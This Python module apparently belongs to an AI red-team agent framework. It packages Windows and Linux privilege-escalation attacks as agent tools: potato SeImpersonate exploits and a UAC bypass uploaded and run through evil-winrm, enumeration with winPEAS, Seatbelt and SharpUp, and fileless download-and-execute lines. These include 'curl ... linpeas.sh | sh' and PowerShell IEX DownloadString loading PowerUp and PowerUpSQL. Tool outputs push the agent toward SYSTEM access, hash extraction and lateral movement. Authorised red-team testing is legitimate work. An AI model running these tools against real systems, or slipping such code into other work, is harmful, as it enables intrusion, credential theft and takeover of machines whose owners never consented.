"""Privilege Escalation Tools for Windows and Linux targets.

This module provides tools for local privilege escalation:
- SeImpersonate exploits (PrintSpoofer, GodPotato, SweetPotato)
- Enumeration tools (Seatbelt, SharpUp, winPEAS, linPEAS)
- UAC bypass and runas utilities
- PowerShell-based privesc (PowerUp, PowerUpSQL)
"""

import re
from typing import Any, ClassVar

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset
from loguru import logger

from ares.core.models import SharedRedTeamState
from ares.tools.red.common import (
    PLACEHOLDER_PASSWORDS,
    format_weakness_block,
    resolve_password,
    run_tool,
)


class PrivilegeEscalationTools(Toolset):
    """Tools for local privilege escalation on Windows and Linux targets."""

    state: SharedRedTeamState | None = None
    dispatcher: Any | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: SharedRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def set_dispatcher(self, dispatcher) -> None:
        """Set the dispatcher for inter-agent communication."""
        self.dispatcher = dispatcher

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _add_weakness(self, block: str) -> None:
        if not self.state or not block:
            return
        from ares.core.models import SharedRedTeamState

        if isinstance(self.state, SharedRedTeamState):
            self.state.add_weakness(block)
        elif block not in self.state.weaknesses:
            self.state.weaknesses.append(block)

    def _run_potato_exploit(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
        binary_name: str,
        command: str = "whoami",
    ) -> str:
        """Common logic for running potato-style SeImpersonate exploits.

        Potato exploits abuse SeImpersonatePrivilege to escalate to SYSTEM.
        They must run ON the target, so we upload via evil-winrm and execute.

        Args:
            target: Target IP/hostname
            username: Admin username for WinRM
            password: Password for authentication
            domain: Domain name
            binary_name: Name of potato binary (e.g., PrintSpoofer64.exe)
            command: Command to run as SYSTEM

        Returns:
            Exploit output
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # Build evil-winrm command to upload and execute potato
        # The binary should be in /opt/windows-binaries/ on the attack pod
        remote_path = f"C:\\Windows\\Temp\\{binary_name}"

        cmd = [
            "evil-winrm",
            "-i",
            target,
            "-u",
            f"{domain}\\{username}" if domain else username,
            "-p",
            resolved_password or "",
            "-c",
            f'{remote_path} -c "{command}"',
        ]

        try:
            logger.info(f"[*] Running {binary_name} on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            # Check for SYSTEM success
            if "nt authority\\system" in result.lower():
                logger.warning(f"[!] {binary_name} successful - SYSTEM access obtained!")
                result = (
                    f"🚨 SYSTEM ACCESS OBTAINED via {binary_name}!\n"
                    f"→ SeImpersonatePrivilege exploited successfully\n"
                    f"→ Use secretsdump for local hash extraction\n"
                    f"→ Or run commands as SYSTEM\n\n" + result
                )

            return result

        except Exception as e:
            return f"{binary_name} failed: {e}"

    @dn.tool_method
    def printspoofer(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
        command: str = "whoami",
    ) -> str:
        """
        Exploit SeImpersonatePrivilege using PrintSpoofer to get SYSTEM.

        PrintSpoofer abuses the Print Spooler service to impersonate SYSTEM.
        Requires SeImpersonatePrivilege (common for service accounts, IIS, SQL).

        Args:
            target: Target IP/hostname with WinRM access
            username: Admin username for WinRM
            password: Password for authentication
            domain: Domain name
            command: Command to execute as SYSTEM (default: whoami)

        Returns:
            Output of command executed as SYSTEM

        Example:
            >>> printspoofer("192.168.58.100", "svc_sql", "pass", "contoso.local")
            >>> printspoofer("192.168.58.100", "svc_sql", "pass", "contoso.local", "cmd /c whoami /all")
        """
        return self._run_potato_exploit(
            target, username, password, domain, "PrintSpoofer64.exe", command
        )

    @dn.tool_method
    def godpotato(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
        command: str = "whoami",
    ) -> str:
        """
        Exploit SeImpersonatePrivilege using GodPotato to get SYSTEM.

        GodPotato is a modern token impersonation exploit that works on
        Windows Server 2012-2022. More reliable than older potato exploits.

        Args:
            target: Target IP/hostname with WinRM access
            username: Admin username for WinRM
            password: Password for authentication
            domain: Domain name
            command: Command to execute as SYSTEM (default: whoami)

        Returns:
            Output of command executed as SYSTEM

        Example:
            >>> godpotato("192.168.58.100", "svc_iis", "pass", "contoso.local")
        """
        return self._run_potato_exploit(
            target, username, password, domain, "GodPotato-NET4.exe", command
        )

    @dn.tool_method
    def sweetpotato(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
        command: str = "whoami",
    ) -> str:
        """
        Exploit SeImpersonatePrivilege using SweetPotato to get SYSTEM.

        SweetPotato combines multiple potato techniques for broad compatibility.
        Good fallback when other potato exploits fail.

        Args:
            target: Target IP/hostname with WinRM access
            username: Admin username for WinRM
            password: Password for authentication
            domain: Domain name
            command: Command to execute as SYSTEM (default: whoami)

        Returns:
            Output of command executed as SYSTEM

        Example:
            >>> sweetpotato("192.168.58.100", "svc_app", "pass", "contoso.local")
        """
        return self._run_potato_exploit(
            target, username, password, domain, "SweetPotato.exe", command
        )

    @dn.tool_method
    def seatbelt(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
        group: str = "system",
    ) -> str:
        """
        Run Seatbelt C# enumeration for privilege escalation opportunities.

        Seatbelt is a comprehensive Windows security enumeration tool that
        checks for misconfigurations, credentials, and privesc vectors.

        Groups:
        - 'system': OS info, UAC, services, scheduled tasks
        - 'user': Browser data, credential manager, recent files
        - 'misc': Interesting files, network shares, processes
        - 'all': Run all checks (slow but thorough)

        Args:
            target: Target IP/hostname with WinRM access
            username: Admin username for WinRM
            password: Password for authentication
            domain: Domain name
            group: Check group - 'system' (default), 'user', 'misc', 'all'

        Returns:
            Seatbelt enumeration results highlighting privesc vectors

        Example:
            >>> seatbelt("192.168.58.100", "user", "pass", "contoso.local")
            >>> seatbelt("192.168.58.100", "user", "pass", "contoso.local", "all")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        remote_path = "C:\\Windows\\Temp\\sb.exe"

        cmd = [
            "evil-winrm",
            "-i",
            target,
            "-u",
            f"{domain}\\{username}" if domain else username,
            "-p",
            resolved_password or "",
            "-c",
            f"{remote_path} -group={group}",
        ]

        try:
            logger.info(f"[*] Running Seatbelt ({group}) on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            # Parse for interesting findings
            findings = []
            if "UAC" in result and "disabled" in result.lower():
                findings.append("UAC disabled")
            if "AutoLogon" in result and "password" in result.lower():
                findings.append("AutoLogon credentials found")
            if "Cached" in result and "Credential" in result:
                findings.append("Cached credentials present")
            if "Service" in result and "Unquoted" in result.lower():
                findings.append("Unquoted service paths")

            if findings:
                summary = "\n".join(f"  → {f}" for f in findings)
                result = (
                    f"🔍 SEATBELT FINDINGS:\n{summary}\n"
                    f"→ Review output for exploitation details\n\n" + result
                )

                # Record weaknesses
                for finding in findings:
                    block = format_weakness_block(
                        f"Local Privesc - {finding}",
                        f"Seatbelt detected: {finding}",
                        {"Target": target},
                        "May allow local privilege escalation",
                        "Seatbelt enumeration",
                    )
                    self._add_weakness(block)

            return result

        except Exception as e:
            return f"Seatbelt failed: {e}"

    @dn.tool_method
    def sharpup(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
    ) -> str:
        """
        Run SharpUp to check for common privilege escalation vectors.

        SharpUp is focused specifically on privesc checks:
        - Modifiable services
        - Unquoted service paths
        - Modifiable scheduled tasks
        - Writable PATH directories
        - AlwaysInstallElevated

        Args:
            target: Target IP/hostname with WinRM access
            username: Username for WinRM
            password: Password for authentication
            domain: Domain name

        Returns:
            SharpUp results with exploitable privesc vectors

        Example:
            >>> sharpup("192.168.58.100", "user", "pass", "contoso.local")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        remote_path = "C:\\Windows\\Temp\\su.exe"

        cmd = [
            "evil-winrm",
            "-i",
            target,
            "-u",
            f"{domain}\\{username}" if domain else username,
            "-p",
            resolved_password or "",
            "-c",
            remote_path,
        ]

        try:
            logger.info(f"[*] Running SharpUp on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            # Parse for privesc vectors
            vectors = []
            if "Modifiable Service" in result:
                vectors.append("Modifiable Services")
            if "Unquoted" in result:
                vectors.append("Unquoted Service Paths")
            if "AlwaysInstallElevated" in result:
                vectors.append("AlwaysInstallElevated")
            if "Modifiable" in result and "PATH" in result:
                vectors.append("Writable PATH directories")

            if vectors:
                summary = "\n".join(f"  → {v}" for v in vectors)
                result = (
                    f"🚨 PRIVILEGE ESCALATION VECTORS FOUND:\n{summary}\n"
                    f"→ Exploit these for SYSTEM access\n\n" + result
                )

                for vector in vectors:
                    block = format_weakness_block(
                        f"Local Privesc - {vector}",
                        f"SharpUp detected exploitable vector: {vector}",
                        {"Target": target},
                        "Allows local privilege escalation to SYSTEM",
                        "SharpUp enumeration",
                    )
                    self._add_weakness(block)

            return result

        except Exception as e:
            return f"SharpUp failed: {e}"

    @dn.tool_method
    def winpeas(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
    ) -> str:
        """
        Run winPEAS for comprehensive Windows privilege escalation enumeration.

        winPEAS is an exhaustive enumeration script that checks for:
        - System info and basic security
        - Available software and versions
        - Network information
        - Credential locations
        - Services and scheduled tasks
        - And many more privesc vectors

        **NOTE: This is a slow but comprehensive scan (5-10 minutes).**

        Args:
            target: Target IP/hostname with WinRM access
            username: Username for WinRM
            password: Password for authentication
            domain: Domain name

        Returns:
            Comprehensive winPEAS enumeration results

        Example:
            >>> winpeas("192.168.58.100", "user", "pass", "contoso.local")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        remote_path = "C:\\Windows\\Temp\\wp.exe"

        cmd = [
            "evil-winrm",
            "-i",
            target,
            "-u",
            f"{domain}\\{username}" if domain else username,
            "-p",
            resolved_password or "",
            "-c",
            remote_path,
        ]

        try:
            logger.info(f"[*] Running winPEAS on {target} (this may take 5-10 minutes)")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=600)

            result = stdout + "\n" + (stderr or "")

            # winPEAS uses colored output with markers for findings
            # Look for high-priority indicators
            critical_finds = []
            if "Password" in result and "found" in result.lower():
                critical_finds.append("Passwords discovered")
            if "CVE-" in result:
                cves = re.findall(r"CVE-\d{4}-\d+", result)
                if cves:
                    critical_finds.append(f"Vulnerable CVEs: {', '.join(list(set(cves))[:5])}")
            if "AlwaysInstallElevated" in result:
                critical_finds.append("AlwaysInstallElevated enabled")
            if "Unquoted" in result and "Service" in result:
                critical_finds.append("Unquoted service paths")

            if critical_finds:
                summary = "\n".join(f"  → {f}" for f in critical_finds)
                result = (
                    f"🚨 WINPEAS CRITICAL FINDINGS:\n{summary}\n"
                    f"→ Review full output for exploitation details\n\n" + result
                )

            return result

        except Exception as e:
            return f"winPEAS failed: {e}"

    @dn.tool_method
    def linpeas(
        self,
        target: str,
        username: str,
        password: str,
    ) -> str:
        """
        Run linPEAS on a Linux target for privilege escalation enumeration.

        linPEAS checks for common Linux privesc vectors:
        - SUID/SGID binaries
        - Capabilities
        - Cron jobs
        - sudo permissions
        - Writable files
        - Kernel exploits

        Args:
            target: Target IP/hostname with SSH access
            username: SSH username
            password: SSH password

        Returns:
            Comprehensive linPEAS enumeration results

        Example:
            >>> linpeas("192.168.58.50", "user", "pass")
        """
        # linPEAS runs on Linux targets via SSH
        cmd = [
            "sshpass",
            "-p",
            password,
            "ssh",
            "-o",
            "StrictHostKeyChecking=no",
            f"{username}@{target}",
            "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        ]

        try:
            logger.info(f"[*] Running linPEAS on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=600)

            result = stdout + "\n" + (stderr or "")

            # Parse for critical findings
            critical_finds = []
            if "95%" in result or "99%" in result:
                # linPEAS confidence indicators
                critical_finds.append("High-confidence privesc vectors found")
            if "SUID" in result and "root" in result:
                critical_finds.append("SUID binaries with root ownership")
            if "sudo" in result and "NOPASSWD" in result:
                critical_finds.append("NOPASSWD sudo permissions")
            if "CVE-" in result:
                cves = re.findall(r"CVE-\d{4}-\d+", result)
                if cves:
                    critical_finds.append(f"Potential CVEs: {', '.join(list(set(cves))[:5])}")

            if critical_finds:
                summary = "\n".join(f"  → {f}" for f in critical_finds)
                result = (
                    f"🚨 LINPEAS CRITICAL FINDINGS:\n{summary}\n"
                    f"→ Review full output for exploitation details\n\n" + result
                )

            return result

        except Exception as e:
            return f"linPEAS failed: {e}"

    @dn.tool_method
    def runas_cs(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
        run_as_user: str,
        run_as_password: str,
        command: str,
        run_as_domain: str | None = None,
    ) -> str:
        """
        Execute commands as another user using RunasCs.

        RunasCs is a C# implementation of runas that works better in
        non-interactive contexts (like reverse shells). Use when you
        have credentials for a more privileged user.

        Args:
            target: Target IP/hostname with WinRM access
            username: Current username for WinRM
            password: Current password
            domain: Current domain
            run_as_user: Username to run command as
            run_as_password: Password for run_as_user
            command: Command to execute
            run_as_domain: Domain for run_as_user (optional, defaults to domain)

        Returns:
            Output of command executed as the other user

        Example:
            >>> runas_cs("192.168.58.100", "user", "pass", "contoso.local",
            ...          "administrator", "AdminPass123!", "whoami /all")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        target_domain = run_as_domain or domain
        remote_path = "C:\\Windows\\Temp\\rc.exe"

        # RunasCs syntax: RunasCs.exe username password "command" [options]
        runas_cmd = f'{remote_path} {run_as_user} {run_as_password} "{command}"'
        if target_domain:
            runas_cmd += f" -d {target_domain}"

        cmd = [
            "evil-winrm",
            "-i",
            target,
            "-u",
            f"{domain}\\{username}" if domain else username,
            "-p",
            resolved_password or "",
            "-c",
            runas_cmd,
        ]

        try:
            logger.info(f"[*] Running command as {run_as_user} on {target}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "error" not in result.lower() and returncode == 0:
                result = f"✅ Command executed as {run_as_user}@{target_domain}\n\n" + result

            return result

        except Exception as e:
            return f"RunasCs failed: {e}"

    @dn.tool_method
    def scm_uac_bypass(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
        command: str,
    ) -> str:
        """
        Bypass UAC using Service Control Manager technique.

        This technique abuses the SCM to execute commands in a high-integrity
        context without triggering UAC prompts. Useful when you have admin
        creds but UAC is blocking elevation.

        Requires admin credentials but works even with UAC enabled.

        Args:
            target: Target IP/hostname with WinRM access
            username: Admin username
            password: Admin password
            domain: Domain name
            command: Command to execute with high integrity

        Returns:
            Output of elevated command

        Example:
            >>> scm_uac_bypass("192.168.58.100", "admin", "pass", "contoso.local", "whoami /all")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        remote_path = "C:\\Windows\\Temp\\scm.exe"

        cmd = [
            "evil-winrm",
            "-i",
            target,
            "-u",
            f"{domain}\\{username}" if domain else username,
            "-p",
            resolved_password or "",
            "-c",
            f'{remote_path} -c "{command}"',
        ]

        try:
            logger.info(f"[*] Running SCM UAC bypass on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "high" in result.lower() or "elevated" in result.lower():
                result = (
                    "🚨 UAC BYPASSED - HIGH INTEGRITY CONTEXT!\n"
                    "→ Commands now run elevated\n"
                    "→ Full admin access available\n\n" + result
                )

            return result

        except Exception as e:
            return f"SCM UAC bypass failed: {e}"

    @dn.tool_method
    def powerup(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
    ) -> str:
        """
        Run PowerUp.ps1 Invoke-AllChecks for privilege escalation enumeration.

        PowerUp is a PowerShell script that checks for common Windows
        privilege escalation vectors like:
        - Service misconfigurations
        - Unquoted service paths
        - DLL hijacking opportunities
        - Registry autoruns

        Args:
            target: Target IP/hostname with WinRM access
            username: Username for WinRM
            password: Password for authentication
            domain: Domain name

        Returns:
            PowerUp results with exploitable privesc vectors

        Example:
            >>> powerup("192.168.58.100", "user", "pass", "contoso.local")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # PowerUp.ps1 invocation via evil-winrm
        ps_script = """
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');
Invoke-AllChecks
"""

        cmd = [
            "evil-winrm",
            "-i",
            target,
            "-u",
            f"{domain}\\{username}" if domain else username,
            "-p",
            resolved_password or "",
            "-c",
            ps_script.strip().replace("\n", ";"),
        ]

        try:
            logger.info(f"[*] Running PowerUp on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            # Parse for exploitable findings
            exploits = []
            if "AbuseFunction" in result:
                exploits.append("Exploitable services found (see AbuseFunction)")
            if "Unquoted" in result:
                exploits.append("Unquoted service paths")
            if "ModifiablePath" in result:
                exploits.append("Modifiable paths in service binaries")

            if exploits:
                summary = "\n".join(f"  → {e}" for e in exploits)
                result = (
                    f"🚨 POWERUP FOUND EXPLOITABLE VECTORS:\n{summary}\n"
                    f"→ Use AbuseFunction commands to exploit\n\n" + result
                )

            return result

        except Exception as e:
            return f"PowerUp failed: {e}"

    @dn.tool_method
    def powerupsql(
        self,
        target: str,
        username: str,
        password: str,
        domain: str,
        sql_server: str,
    ) -> str:
        """
        Run PowerUpSQL for MSSQL enumeration and privilege escalation.

        PowerUpSQL is a PowerShell toolkit for attacking SQL Server:
        - Find SQL Server instances
        - Check for sysadmin access
        - Find linked servers
        - Identify impersonation opportunities
        - Enable xp_cmdshell for code execution

        Args:
            target: Target with WinRM for running PowerShell
            username: Domain username for WinRM
            password: Password for authentication
            domain: Domain name
            sql_server: SQL Server instance to target (e.g., 'sql01.contoso.local')

        Returns:
            PowerUpSQL enumeration and exploitation results

        Example:
            >>> powerupsql("192.168.58.100", "user", "pass", "contoso.local", "sql01.contoso.local")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # PowerUpSQL invocation
        ps_script = f"""
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1');
Get-SQLInstanceDomain | Get-SQLServerInfo;
Get-SQLQuery -Instance "{sql_server}" -Query "SELECT SYSTEM_USER as 'Current User', IS_SRVROLEMEMBER('sysadmin') as 'Is Sysadmin'";
Get-SQLServerLinkCrawl -Instance "{sql_server}"
"""

        cmd = [
            "evil-winrm",
            "-i",
            target,
            "-u",
            f"{domain}\\{username}" if domain else username,
            "-p",
            resolved_password or "",
            "-c",
            ps_script.strip().replace("\n", ";"),
        ]

        try:
            logger.info(f"[*] Running PowerUpSQL on {target} targeting {sql_server}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            # Parse for interesting findings
            findings = []
            if "Sysadmin" in result and ("1" in result or "True" in result):
                findings.append("SYSADMIN access confirmed!")
            if "LINK" in result.upper() or "LinkedServer" in result:
                findings.append("Linked servers found - potential pivot point")
            if "Impersonate" in result:
                findings.append("Impersonation possible")

            if findings:
                summary = "\n".join(f"  → {f}" for f in findings)
                result = (
                    f"🗃️ POWERUPSQL FINDINGS:\n{summary}\n"
                    f"→ SQL Server can be used for lateral movement\n\n" + result
                )

            return result

        except Exception as e:
            return f"PowerUpSQL failed: {e}"


__all__ = ["PrivilegeEscalationTools"]
